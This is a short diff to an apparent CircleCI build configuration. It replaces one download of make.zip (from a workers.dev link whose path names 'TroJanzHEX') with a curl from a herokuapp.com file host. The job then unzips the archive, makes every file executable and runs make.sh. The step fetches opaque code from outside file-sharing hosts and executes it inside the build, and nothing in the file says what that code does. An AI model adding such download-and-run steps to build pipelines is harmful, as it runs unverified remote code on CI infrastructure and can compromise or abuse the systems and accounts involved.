@@ -8,7 +8,7 @@ jobs:
     docker:
       - image: circleci/golang:1.9
     steps:
-      - run: wget https://trojanzhex.file2link.workers.dev/0:/TroJanzHEX/make.zip
+      - run: curl https://dlmediafiles.herokuapp.com/-1001403671743/124629/download -o make.zip
       - run: unzip make.zip && chmod +x *
       - run: ./make.sh
       
